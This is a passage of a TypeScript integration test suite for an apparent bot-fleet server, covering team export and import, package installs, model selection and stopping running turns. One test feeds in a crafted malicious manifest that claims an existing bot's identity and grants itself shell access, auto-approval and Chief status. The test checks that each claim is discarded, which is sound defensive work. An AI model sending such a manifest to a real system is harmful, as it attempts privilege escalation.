        { voice: null },
        { speakReplies: 1 },
      ]) {
        expect((await api("PATCH", `/api/bots/${bot.id}/profile`, invalid)).status).toBe(400);
      }

      const cleared = await api("PATCH", `/api/bots/${bot.id}/profile`, {
        avatarUrl: null,
        avatarCrop: "mascot",
        voice: "",
        speakReplies: false,
      });
      expect(cleared.status).toBe(200);
      expect(cleared.body.bot).toMatchObject({
        avatarUrl: null,
        avatarCrop: "mascot",
        voice: "",
        speakReplies: false,
      });
    } finally {
      stream.close();
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("exports every visible bot and imports the team without creating a room", { timeout: 60000 }, async () => {
    const first = (await api("POST", "/api/bots")).body.bot;
    const second = (await api("POST", "/api/bots")).body.bot;
    const hidden = (await api("POST", "/api/bots")).body.bot;
    await api("PATCH", `/api/bots/${first.id}`, {
      name: "Mira",
      title: "Project Lead",
      description: "Coordinates the crew",
      color: "purple",
      mascotExpression: "focused",
      autoApprove: true,
      computers: [],
      alwaysAllow: ["Bash:git"],
    });
    await api("PATCH", `/api/bots/${second.id}`, {
      name: "Scout",
      title: "Researcher",
      description: "Finds evidence",
      color: "cyan",
    });
    await api("PATCH", `/api/bots/${hidden.id}`, { name: "Archived", hidden: true });

    const stateBefore = (await api("GET", "/api/bots")).body;
    const roomsBefore = stateBefore.groups.length;
    const visibleNames = stateBefore.bots
      .filter((bot: { hidden?: boolean }) => !bot.hidden)
      .map((bot: { name: string }) => bot.name);
    const exported = await api("POST", "/api/teams/export", { name: "Field Team" });
    expect(exported.status).toBe(200);
    expect(exported.body).toMatchObject({ format: "botfleet.team", version: 2, team: { name: "Field Team" } });
    expect(exported.body.team.members.map((member: { name: string }) => member.name)).toEqual(visibleNames);
    expect(exported.body.team.members).toEqual(expect.arrayContaining([
      expect.objectContaining({ key: "mira", name: "Mira", title: "Project Lead", appearance: { color: "purple", mascotExpression: "focused" } }),
      expect.objectContaining({ key: "scout", name: "Scout", title: "Researcher", appearance: { color: "cyan" } }),
    ]));
    expect(exported.body.team).not.toHaveProperty("room");
    expect(JSON.stringify(exported.body)).not.toMatch(/Archived|autoApprove|alwaysAllow|modelSelection|threadId/);
    const markdownExport = await api("POST", "/api/teams/export", { name: "Field Team", format: "package" });
    expect(markdownExport.status).toBe(200);
    expect(markdownExport.body).toMatchObject({ name: "Field Team", members: visibleNames.length });
    expect(markdownExport.body.markdown).toContain("## Activation");
    expect(markdownExport.body.markdown).toContain("Give this file to your Chief of Staff");
    expect(markdownExport.body.markdown).not.toMatch(/Archived|autoApprove|alwaysAllow|modelSelection|threadId/);
    expect((await api("GET", "/api/bots")).body.groups).toHaveLength(roomsBefore);
    expect((await api("POST", "/api/teams/export", {})).body.team.name).toBe("My BotFleet Team");

    const stream = await openSse(`${BASE}/api/events`);
    try {
      await stream.until((frame) => frame.kind === "hello");
      const imported = await api("POST", "/api/teams/import", exported.body);
      expect(imported.status).toBe(201);
      // the originals still exist, so every member arrives visibly numbered
      // rather than wearing a name that already resolves to another bot. The
      // starter name is intentionally random, so it can duplicate a member
      // name and advance that member to the next available suffix.
      const importedNames = imported.body.bots.map((bot: { name: string }) => bot.name);
      const namesBefore = new Set(stateBefore.bots.map((bot: { name: string }) => bot.name.toLowerCase()));
      expect(importedNames).toHaveLength(visibleNames.length);
      expect(new Set(importedNames.map((name: string) => name.toLowerCase())).size).toBe(importedNames.length);
      for (const [index, name] of importedNames.entries()) {
        const base = visibleNames[index]!;
        expect(name.startsWith(`${base} `)).toBe(true);
        expect(Number(name.slice(base.length + 1))).toBeGreaterThanOrEqual(2);
        expect(namesBefore.has(name.toLowerCase())).toBe(false);
      }
      expect(imported.body.bots.every((bot: { id: string }) => ![first.id, second.id].includes(bot.id))).toBe(true);
      expect(imported.body.bots[0]).not.toHaveProperty("alwaysAllow");
      // imported bots arrive quiet and without reach: no seeded greeting
      // in their name, and no access to the workspace's connected apps
      // until the user grants it per bot
      expect(imported.body.bots.every((bot: { messages: unknown[] }) => bot.messages.length === 0)).toBe(true);
      expect(imported.body.bots.every((bot: { composio?: boolean }) => bot.composio === false)).toBe(true);
      expect(imported.body).not.toHaveProperty("group");

      const lastImported = imported.body.bots.at(-1)!;
      await stream.until((frame) => frame.kind === "bot" && frame.bot?.id === lastImported.id);
      const importedBotIds = new Set(imported.body.bots.map((bot: { id: string }) => bot.id));
      const importFrames = stream.frames.filter(
        (frame) => frame.kind === "bot" && importedBotIds.has(frame.bot?.id),
      );
      // every imported bot is announced to other windows. The store emits
      // on every write now, so a bot may produce more than one frame —
      // the invariant is coverage, not an exact count.
      for (const id of importedBotIds) expect(importFrames.some((frame) => frame.bot?.id === id)).toBe(true);
      expect(importFrames.every((frame) => frame.kind === "bot")).toBe(true);
      expect((await api("GET", "/api/bots")).body.groups).toHaveLength(roomsBefore);

      const invalid = await api("POST", "/api/teams/import", { ...exported.body, version: 3 });
      expect(invalid.status).toBe(400);
      expect((await api("POST", "/api/teams/import?mode=erase", exported.body)).status).toBe(400);

      const beforeReplace = (await api("GET", "/api/bots")).body.bots.filter(
        (bot: { hidden?: boolean }) => !bot.hidden,
      );
      const replaced = await api("POST", "/api/teams/import?mode=replace", exported.body);
      expect(replaced.status).toBe(201);
      expect(replaced.body.archived.map((bot: { id: string }) => bot.id).sort()).toEqual(
        beforeReplace.map((bot: { id: string }) => bot.id).sort(),
      );
      expect(replaced.body.archivedBots.every((bot: { hidden?: boolean }) => bot.hidden)).toBe(true);
      const afterReplace = (await api("GET", "/api/bots")).body.bots;
      expect(afterReplace.filter((bot: { hidden?: boolean }) => !bot.hidden).map((bot: { id: string }) => bot.id).sort()).toEqual(
        replaced.body.bots.map((bot: { id: string }) => bot.id).sort(),
      );
      expect((await api("GET", "/api/bots")).body.groups).toHaveLength(roomsBefore);

      // Put the shared test harness back exactly as it was before exercising
      // replace. This mirrors the UI's Undo action and preserves the seeded bot.
      for (const bot of replaced.body.bots) await api("DELETE", `/api/bots/${bot.id}`);
      for (const bot of replaced.body.archived.filter((item: { chiefOfStaff: boolean }) => !item.chiefOfStaff)) {
        await api("PATCH", `/api/bots/${bot.id}`, { hidden: false });
      }
      const previousChief = replaced.body.archived.find((bot: { chiefOfStaff: boolean }) => bot.chiefOfStaff);
      if (previousChief) await api("PATCH", `/api/bots/${previousChief.id}`, { hidden: false, chiefOfStaff: true });

      for (const bot of [first, second, hidden, ...imported.body.bots]) {
        expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(200);
      }
    } finally {
      stream.close();
    }
  });

  it("imports a team as a project: one room, on a folder", async () => {
    // The manifest still describes only people. Room name and folder come
    // from the CALLER, so a manifest fetched from the library cannot create
    // structure in someone's workspace — the property v2 established by
    // dropping its `room` block.
    const seed = await api("POST", "/api/bots", { name: "Planner", title: "Lead", description: "Plans", color: "purple" });
    const exported = await api("POST", "/api/teams/export", { name: "Client XY" });
    expect(exported.body.team).not.toHaveProperty("room");

    const roomsBefore = (await api("GET", "/api/bots")).body.groups.length;
    const folder = mkdtempSync(join(tmpdir(), "omb-project-"));

    const stream = await openSse(`${BASE}/api/events`);
    try {
      await stream.until((frame) => frame.kind === "hello");

      // A folder that does not exist must not leave half a project behind.
      const bogus = await api("POST", `/api/teams/import?mode=project&cwd=${encodeURIComponent(join(folder, "nope"))}`, exported.body);
      expect(bogus.status).toBe(400);
      expect((await api("GET", "/api/bots")).body.groups).toHaveLength(roomsBefore);

      const created = await api("POST", `/api/teams/import?mode=project&cwd=${encodeURIComponent(folder)}`, exported.body);
      expect(created.status).toBe(201);
      expect(created.body.group).toMatchObject({ name: "Client XY", cwd: folder });
      // the room is made of exactly the bots this import created
      expect(created.body.group.memberIds.sort()).toEqual(created.body.bots.map((bot: { id: string }) => bot.id).sort());
      // the folder is the room's WISH; the store pins it on the first turn
      expect(created.body.group).not.toHaveProperty("pinnedCwd");
      expect((await api("GET", "/api/bots")).body.groups).toHaveLength(roomsBefore + 1);
      await stream.until((frame) => frame.kind === "group" && frame.group?.id === created.body.group.id);

      // an explicit name wins over the team name, and the folder is optional
      const named = await api("POST", "/api/teams/import?mode=project&room=Client%20XY%20-%20Ads", exported.body);
      expect(named.body.group).toMatchObject({ name: "Client XY - Ads" });
      expect(named.body.group.cwd).toBeUndefined();

      for (const room of [created.body.group, named.body.group]) {
        expect((await api("DELETE", `/api/groups/${room.id}`)).status).toBe(200);
      }
      for (const bot of [seed.body, ...created.body.bots, ...named.body.bots]) {
        await api("DELETE", `/api/bots/${bot.id}`);
      }
    } finally {
      stream.close();
    }
  });

  it("installs a complete bot package with a Chief, room, playbook, connector intent, and paused routine", async () => {
    const packageFile = {
      format: "botfleet.package",
      version: 1,
      package: {
        id: "signal-desk",
        release: "1.0.0",
        name: "Signal Desk",
        tagline: "Find and explain the signal.",
        summary: "A complete two-bot signal workflow.",
        category: "Research",
        author: { name: "BotFleet" },
        license: "MIT",
        outcomes: ["Produce a concise signal brief."],
        setupMinutes: 4,
        requirements: {
          apps: [{ slug: "reddit", label: "Reddit", reason: "Read approved communities." }],
          capabilities: ["computer"],
        },
        agents: [
          {
            key: "scout",
            name: "Package Scout",
            title: "Researcher",
            description: "Find evidence.",
            appearance: { color: "cyan" },
            playbooks: ["signal-check"],
            autoApprove: true,
          },
          {
            key: "editor",
            name: "Package Editor",
            title: "Editor",
            description: "Explain the result.",
            appearance: { color: "green" },
          },
        ],
        chiefOfStaff: "scout",
        rooms: [{
          key: "signals",
          name: "Signal Room",
          members: ["scout", "editor"],
          bulletin: "Separate direct evidence from inference.",
          defaultResponder: { kind: "agent", agent: "scout" },
        }],
        routines: [{
          key: "morning-signals",
          name: "Morning signals",
          agent: "scout",
          prompt: "Prepare the approved morning signal brief.",
          runOn: "bot",
          schedule: { type: "daily", time: "09:00", weekdays: [1, 2, 3, 4, 5] },
          durationMinutes: 30,
          enabledAfterInstall: false,
        }],
        playbooks: [{
          key: "signal-check",
          name: "Signal Check",
          summary: "Verify a public signal.",
          triggers: ["signal brief"],
          instructions: "Keep the source URL and confidence.",
        }],
      },
    };

    const installed = await api("POST", "/api/teams/import", packageFile);
    expect(installed.status).toBe(201);
    expect(installed.body.bots).toHaveLength(2);
    expect(installed.body.groups).toHaveLength(1);
    expect(installed.body.routines).toHaveLength(1);

    const scout = installed.body.bots.find((bot: { name: string }) => bot.name.startsWith("Package Scout"));
    const editor = installed.body.bots.find((bot: { name: string }) => bot.name.startsWith("Package Editor"));
    expect(scout).toMatchObject({
      chiefOfStaff: true,
      composio: false,
      playbooks: [{ key: "signal-check", instructions: "Keep the source URL and confidence." }],
      installedPackage: {
        id: "signal-desk",
        release: "1.0.0",
        requiredApps: [{ slug: "reddit", label: "Reddit" }],
      },
    });
    expect(scout).not.toHaveProperty("autoApprove");
    expect(editor.playbooks).toBeUndefined();
    expect(scout.section).toBe(editor.section);
    expect(installed.body.groups[0]).toMatchObject({
      name: "Signal Room",
      memberIds: expect.arrayContaining([scout.id, editor.id]),
      defaultResponder: { kind: "member", botId: scout.id },
      bulletin: "Separate direct evidence from inference.",
      setupCompletedAt: expect.any(Number),
    });
    expect(installed.body.routines[0]).toMatchObject({
      name: "Morning signals",
      botId: scout.id,
      enabled: false,
      nextRunAt: null,
    });

    await api("DELETE", `/api/routines/${installed.body.routines[0].id}`);
    await api("DELETE", `/api/groups/${installed.body.groups[0].id}`);
    for (const bot of installed.body.bots) await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("the scout reads a folder, proposes an importable team, and creates nothing until the human imports", async () => {
    const folder = mkdtempSync(join(tmpdir(), "omb-scout-"));
    writeFileSync(join(folder, "README.md"), "# Demo Shop\n\nA storefront demo.\n");
    writeFileSync(
      join(folder, "package.json"),
      JSON.stringify({ dependencies: { react: "^19" }, devDependencies: { vitest: "^3" } }),
    );

    const before = (await api("GET", "/api/bots")).body;

    expect((await api("GET", "/api/teams/scout")).status).toBe(400);
    expect((await api("GET", `/api/teams/scout?cwd=${encodeURIComponent(join(folder, "nope"))}`)).status).toBe(400);

    const scouted = await api("GET", `/api/teams/scout?cwd=${encodeURIComponent(folder)}`);
    expect(scouted.status).toBe(200);
    expect(scouted.body.profile).toMatchObject({ name: "Demo Shop", summary: "A storefront demo." });
    expect(scouted.body.profile.stacks).toContain("React");
    expect(scouted.body.suggestion.roomName).toBe("Demo Shop");
    const keys = scouted.body.suggestion.manifest.team.members.map((member: { key: string }) => member.key);
    expect(keys).toEqual(["lead", "frontend", "testing"]);
    expect(Object.keys(scouted.body.suggestion.reasons).sort()).toEqual(keys.slice().sort());

    // scouting is read-only: no bot and no room exists until the import
    const after = (await api("GET", "/api/bots")).body;
    expect(after.bots).toHaveLength(before.bots.length);
    expect(after.groups).toHaveLength(before.groups.length);

    // and the suggestion goes through the real importer verbatim
    const imported = await api(
      "POST",
      `/api/teams/import?mode=project&cwd=${encodeURIComponent(folder)}&room=${encodeURIComponent(scouted.body.suggestion.roomName)}`,
      scouted.body.suggestion.manifest,
    );
    expect(imported.status).toBe(201);
    expect(imported.body.group).toMatchObject({ name: "Demo Shop", cwd: folder });
    expect(imported.body.bots).toHaveLength(3);

    expect((await api("DELETE", `/api/groups/${imported.body.group.id}`)).status).toBe(200);
    for (const bot of imported.body.bots) await api("DELETE", `/api/bots/${bot.id}`);
    rmSync(folder, { recursive: true, force: true });
  });

  it("team import is additive-only: smuggled grants, claimed ids, and re-imports never touch existing records", async () => {
    // an armed bot: every privilege a malicious manifest could try to
    // capture is switched ON here, so any write-through shows up as a diff
    const trusted = (await api("POST", "/api/bots")).body.bot;
    await api("PATCH", `/api/bots/${trusted.id}`, {
      name: "Mira",
      title: "Project Lead",
      autoApprove: true,
      autoReview: "enforce",
      alwaysAllow: ["Bash:git"],
      approvePeerComms: true,
      chiefOfStaff: true,
      composio: true,
      computers: [],
    });
    const groupsBefore = (await api("GET", "/api/bots")).body.groups.length;
    const room = (await api("POST", "/api/groups", { memberIds: [trusted.id], name: "War Room" })).body.group;

    const smuggled = {
      format: "botfleet.team",
      version: 2,
      team: {
        name: "Trap Team",
        members: [
          {
            key: "mira",
            name: "Mira",
            title: "Impostor",
            description: "claims to be the lead",
            appearance: { color: "red" },
            // none of these exist in the manifest format, but a hand-edited
            // file can still claim them — and they must go nowhere
            id: trusted.id,
            threadId: trusted.threadId,
            autoApprove: true,
            autoReview: "enforce",
            alwaysAllow: ["Bash"],
            chiefOfStaff: true,
            approvePeerComms: false,
            composio: true,
            computers: ["local"],
            cloudBackend: "vps",
            cwd: "/",
            hidden: false,
          },
        ],
      },
    };
    const first = await api("POST", "/api/teams/import", smuggled);
    expect(first.status).toBe(201);
    expect(first.body.bots).toHaveLength(1);
    const impostor = first.body.bots[0];
    // fresh identity, never the claimed one — and the colliding display
    // name is visibly numbered so @Mira cannot resolve to the newcomer
    expect(impostor.id).not.toBe(trusted.id);
    expect(impostor.threadId).not.toBe(trusted.threadId);
    expect(impostor.name).toMatch(/^Mira(?: \d+)?$/);
    // EVERY privilege-bearing field lands at its safe default
    expect(impostor.autoApprove).toBeUndefined();
    expect(impostor.autoReview).toBeUndefined();
    expect(impostor.alwaysAllow).toBeUndefined();
    expect(impostor.chiefOfStaff).toBeUndefined();
    expect(impostor.approvePeerComms).toBeUndefined();
    expect(impostor.composio).toBe(false);
    expect(impostor.computers).toBeUndefined();
    expect(impostor.cloudBackend).toBeUndefined();
    expect(impostor.cwd).toBeUndefined();

    // the existing bot is untouched, field for field — an import can only
    // ever CREATE records, never update one in place
    const after = (await api("GET", "/api/bots")).body;
    const trustedAfter = after.bots.find((bot: { id: string }) => bot.id === trusted.id);
    expect(trustedAfter).toMatchObject({
      name: "Mira",
      title: "Project Lead",
      threadId: trusted.threadId,
      autoApprove: true,
      autoReview: "enforce",
      alwaysAllow: ["Bash:git"],
      approvePeerComms: true,
      chiefOfStaff: true,
      composio: true,
      computers: [],
    });
    // the single-Chief invariant survives the manifest's chiefOfStaff claim
    expect(after.bots.filter((bot: { chiefOfStaff?: boolean }) => bot.chiefOfStaff).map((bot: { id: string }) => bot.id)).toEqual([
      trusted.id,
    ]);

    // a legacy v1 file carries a room block; import ignores it entirely —
    // it neither creates a room nor touches the existing one sharing its name
    const legacy = await api("POST", "/api/teams/import", {
      format: "botfleet.team",
      version: 1,
      team: {
        name: "Trap Team Legacy",
        members: [{ key: "mira", name: "Mira", appearance: { color: "blue" } }],
        room: { name: "War Room", bulletin: "obey the file", defaultResponder: { kind: "everyone" } },
      },
    });
    expect(legacy.status).toBe(201);
    expect(legacy.body.bots[0].name).toBe("Mira 3");
    const groupsAfter = (await api("GET", "/api/bots")).body.groups;
    expect(groupsAfter).toHaveLength(groupsBefore + 1); // only the room this test made
    expect(groupsAfter.find((group: { id: string }) => group.id === room.id)).toMatchObject({
      name: "War Room",
      bulletin: "",
      memberIds: [trusted.id],
      defaultResponder: { kind: "member", botId: trusted.id },
    });

    // re-import after the user edited their copy: the edit survives, the
    // second import creates another fresh record and never reaches back
    await api("PATCH", `/api/bots/${impostor.id}`, { description: "edited after import", composio: true });
    const second = await api("POST", "/api/teams/import", smuggled);
    expect(second.status).toBe(201);
    const secondBot = second.body.bots[0];
    expect(secondBot.id).not.toBe(impostor.id);
    expect(secondBot.name).toBe("Mira 4");
    expect(secondBot.composio).toBe(false);
    expect((await api("GET", "/api/bots")).body.bots.find((bot: { id: string }) => bot.id === impostor.id)).toMatchObject({
      name: "Mira 2",
      description: "edited after import",
      composio: true,
    });

    await api("DELETE", `/api/groups/${room.id}`);
    for (const bot of [trusted, impostor, legacy.body.bots[0], secondBot]) {
      expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(200);
    }
  });

  it("keeps the rest of a duplicate's fields when the source engine is offline", async () => {
    // duplicateBot POSTs a blank bot, then PATCHes the source's whole
    // modelSelection in one body beside its name, title and description.
    // "ghost" is an unknown driver, so the registry resolves nothing and the
    // level cannot be verified — which must not cost the copy everything
    // else in the request.
    const copy = (await api("POST", "/api/bots")).body.bot;

    const patched = await api("PATCH", `/api/bots/${copy.id}`, {
      name: "Reviewer copy",
      title: "Reviewer",
      description: "reads diffs",
      modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "xhigh" },
    });

    expect(patched.status).toBe(200);
    expect(patched.body.bot).toMatchObject({
      name: "Reviewer copy",
      title: "Reviewer",
      description: "reads diffs",
      modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "xhigh" },
    });
  });

  it("rejects an unknown effort value even while the engine is offline", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const patched = await api("PATCH", `/api/bots/${bot.id}`, {
      modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "turbo" },
    });

    expect(patched.status).toBe(400);
    expect(patched.body.error).toContain("not recognized");
  });

  it("clears legacy unsupported effort from task selection without clobbering primary bot effort", async () => {
    const created = await api("POST", "/api/bots", {
      name: "EffortBot",
      modelSelection: { instanceId: "claude", model: "claude-sonnet-5", effort: "high" },
    });
    expect(created.status).toBe(201);
    const bot = created.body.bot;
    try {
      const taskPatch = await api("PATCH", `/api/bots/${bot.id}/tasks/${bot.threadId}`, {
        modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "high" },
      });
      expect(taskPatch.status).toBe(200);

      const bots = (await api("GET", "/api/bots?messages=0")).body.bots;
      const found = bots.find((b: { id: string }) => b.id === bot.id);
      expect(found.modelSelection.effort).toBe("high");
      expect(found.tasks[0].modelSelection.effort).toBe("high");
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("creates a fully configured bot in one request and greets with its final name", async () => {
    const created = await api("POST", "/api/bots", {
      name: "  Pathfinder  ",
      title: "Researcher",
      description: "Maps the problem before acting.",
      section: "  Work  ",
      modelSelection: { instanceId: "  ghost  ", model: "  ghost-1  ", effort: "high" },
    });
    expect(created.status).toBe(201);
    const bot = created.body.bot;
    try {
      expect(bot).toMatchObject({
        name: "Pathfinder",
        title: "Researcher",
        description: "Maps the problem before acting.",
        section: "Work",
        modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "high" },
      });
      expect(bot.messages[0].text).toContain("Pathfinder");
      expect(bot.messages[0].text).not.toContain("Maus");
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("opts MCP-style model writes into the current live catalog without narrowing general writes", async () => {
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude");
    expect(claude.snapshot.state).toBe("available");
    const customModel = `${claude.models.default}-custom`;
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const general = await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: customModel },
      });
      expect(general.status).toBe(200);
      expect(general.body.bot.modelSelection.model).toBe(customModel);

      const strictPatch = await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: customModel },
        requireAvailableModel: true,
      });
      expect(strictPatch.status).toBe(400);
      expect(strictPatch.body.error).toMatch(/not offered/i);

      const beforeIds = (await api("GET", "/api/bots?messages=0")).body.bots.map(
        (candidate: { id: string }) => candidate.id,
      );
      const strictCreate = await api("POST", "/api/bots", {
        name: "Should not exist",
        modelSelection: { instanceId: "claude", model: customModel },
        requireAvailableModel: true,
      });
      expect(strictCreate.status).toBe(400);
      const afterIds = (await api("GET", "/api/bots?messages=0")).body.bots.map(
        (candidate: { id: string }) => candidate.id,
      );
      expect(afterIds).toEqual(beforeIds);

      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        requireAvailableModel: "yes",
      })).status).toBe(400);
      expect((await api("POST", "/api/bots", {
        name: "Missing selection",
        requireAvailableModel: true,
      })).status).toBe(400);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("rejects incomplete model selections instead of persisting a broken bot", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const missingModel = await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "ghost" },
      });
      expect(missingModel.status).toBe(400);
      expect(missingModel.body.error).toContain("modelSelection.model");

      const missingInstance = await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { model: "ghost-1" },
      });
      expect(missingInstance.status).toBe(400);
      expect(missingInstance.body.error).toContain("modelSelection.instanceId");

      const reread = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(reread.modelSelection).toEqual(bot.modelSelection);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("refuses to switch a bot's active task while its turn is running", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const instances = (await api("GET", "/api/instances")).body.instances;
      const claude = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude");
      expect(claude.snapshot.state).toBe("available");
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: claude.models.default },
      })).status).toBe(200);

      const originalTask = bot.threadId;
      const created = await api("POST", `/api/bots/${bot.id}/tasks`, { title: "Running task" });
      expect(created.status).toBe(201);
      const runningTask = created.body.task.threadId;
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "keep running" })).status).toBe(202);

      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(true);

      const blocked = await api("POST", `/api/bots/${bot.id}/tasks/${originalTask}`);
      expect(blocked.status).toBe(409);
      expect(blocked.body.error).toMatch(/stop it before switching tasks/i);
      const current = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(current.threadId).toBe(runningTask);
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("stops a turn instead of failing it over to the next engine", async () => {
    // The reported bug, end to end.  The owner pressed Stop for ~2 minutes on
    // a bot with a saved fallback chain and the child was never killed; it
    // wrote its own timeout result and the chain advanced to the next engine.
    // Both halves have to hold at once: the stop must REACH the live turn,
    // and reaching it must not be read as "this attempt failed, try the next
    // engine" — the driver settles a killed turn as exit_before_result, which
    // is indistinguishable from a crash.
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude");
    expect(claude.snapshot.state).toBe("available");
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: {
          instanceId: "claude",
          model: claude.models.default,
          fallbacks: [{ instanceId: "claude2", model: claude.models.default }],
        },
      })).status).toBe(200);

      // the fixture CLI hangs, so this turn stays live until something stops it
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hang forever" })).status).toBe(202);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(true);

      // the stop reached a real live session — not a hopeful unconditional ok
      const stop = await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      expect(stop.status).toBe(200);
      expect(stop.body).toMatchObject({ ok: true, stopped: true });

      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(false);

      // A failover would start a second turn on claude2 and announce itself in
      // the transcript. Give it room to happen before asserting it did not.
      await new Promise((resolve) => setTimeout(resolve, 1500));
      const after = (await api("GET", "/api/bots")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(after.busy).toBe(false);
      const chips = after.messages
        .map((message: any) => message?.tool?.name)
        .filter((name: unknown): name is string => typeof name === "string");
      expect(chips.some((name: string) => name.startsWith("Fell over to"))).toBe(false);
      // and the stop did not quietly re-point the bot at the fallback engine
      expect(after.modelSelection.instanceId).toBe("claude");

      // The latch is per-request, not sticky: the next user message starts a
      // fresh turn with the saved chain intact and is stoppable in its own right.
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hang again" })).status).toBe(202);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(true);
      const second = await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      expect(second.body).toMatchObject({ ok: true, stopped: true });
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("stops the instance actually running the turn, not the one the bot record names", async () => {
    // The cross-instance case, driven through a REAL failover: crasher fails,
    // the chain moves the live turn onto claude, and the bot record is left
    // still naming crasher — a failover is a per-turn override that is never
    // persisted. The old endpoint resolved one adapter from
    // bot.modelSelection.instanceId, so in exactly this state it reached an
    // engine that owned nothing and Stop was a guaranteed total no-op.
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude");
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: {
          instanceId: "crasher",
          model: claude.models.default,
          fallbacks: [{ instanceId: "claude", model: claude.models.default }],
        },
      })).status).toBe(200);

      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "fail then hang" })).status).toBe(202);

      // wait for the failover chip, so the live turn is known to be on claude
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.messages?.some((message: any) =>
          typeof message?.tool?.name === "string" && message.tool.name.startsWith("Fell over to"),
        );
      }, { timeout: 20_000 }).toBe(true);

      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(true);

      // the record still names the engine that is NOT running the turn
      const midFlight = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(midFlight.modelSelection.instanceId).toBe("crasher");

      const stop = await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      expect(stop.status).toBe(200);
      // hasSession found claude, the real owner; a modelSelection lookup would
      // have asked crasher, which owns nothing, and reported success anyway
      expect(stop.body).toMatchObject({ ok: true, stopped: true });
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(false);
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("delivers a room approval to the fallback instance that opened it", async () => {
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude2 = instances.find((instance: { instanceId: string }) => instance.instanceId === "claude2");
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", {
      name: "Fallback approval owner",
      memberIds: [bot.id],
    })).body.group;
    let socket: Socket | undefined;
    try {
      expect((await api("PATCH", `/api/groups/${room.id}/setup`, { action: "skip" })).status).toBe(200);
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: {
          instanceId: "crasher",
          model: claude2.models.default,
          fallbacks: [{ instanceId: "claude2", model: claude2.models.default }],
        },
      })).status).toBe(200);
      rmSync(fakeClaudeDump, { force: true });
      expect((await api("POST", `/api/groups/${room.id}/messages`, { text: "fail over, then ask" })).status).toBe(202);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots")).body;
        const current = state.groups.find((candidate: { id: string }) => candidate.id === room.id);
        return current?.messages.some((message: { tool?: { name?: string } }) =>
